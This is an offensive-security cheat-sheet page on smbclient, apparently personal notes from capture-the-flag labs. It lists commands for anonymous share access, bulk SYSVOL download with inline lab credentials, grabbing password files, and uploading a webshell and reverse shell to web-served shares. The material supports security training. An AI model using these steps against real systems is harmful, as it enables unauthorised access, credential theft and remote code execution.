# smbclient

## Kenobi Commands

```bash
smbclient //$TARGET/anonymous
get log.txt
```
Used on: **Kenobi** - pulled the anonymous SMB note that pointed toward the FTP/NFS path.

FTP-like interactive client for SMB shares. Used for anonymous enumeration, downloading files and recursively mirroring shares like SYSVOL.

## Commands Used

### Anonymous access to a specific share
```bash
smbclient //TARGET_IP/software$ -N
```
Used on: **Overwatch**

- `-N` — no password (null session)

### Recursive download of SYSVOL
```bash
smbclient //TARGET_IP/SYSVOL -U overwatch.htb/sqlsvc%'TI0LKcfHzZw1Vv' \
  -c "recurse ON; prompt OFF; cd overwatch.htb; mget *"
```
Used on: **Overwatch**

- `-U DOMAIN/USER%PASSWORD` — inline credentials
- `-c` — run a semicolon-separated command list non-interactively
- `recurse ON; prompt OFF; mget *` — recursive mass-get without prompting

### Push a webshell to a writable share (one-shot upload)
```bash
smbclient //$TARGET/nt4wrksv -U 'Bob%!P@$$W0rD!123' -c "put shell.asp"
```
Used on: **Relevant** — landed `shell.asp` into a share mirrored by IIS at `:49663/nt4wrksv/`. Pair with [smb-write-iis-execution.md](../../exploits/web-rce/smb-write-iis-execution.md).

- `-U 'user%password'` — inline auth, single-quoted to protect `!`, `$`, `@`
- `-c "put <local>"` — non-interactive single command

### Anonymous read + grab a file
```bash
smbclient //$TARGET/nt4wrksv -N -c "get passwords.txt"
```
Used on: **Relevant** — `passwords.txt` contained base64-encoded creds (see [base64-encoded-credentials.md](../../techniques/creds/base64-encoded-credentials.md)).

### Anonymous share walk with recursive download
```bash
smbclient //$TARGET/anonymous
mget *
```
Used on: **Skynet** — guest access exposed internal notes and password-related files under the anonymous share.



### Authenticated access to writable web-backed share
```bash
smbclient //$TARGET/SECURED -U 'ArthurMorgan%DeadEye'
```
Used on: **coldvvars** - authenticated to the writable share used to place the PHP reverse shell in the web path.
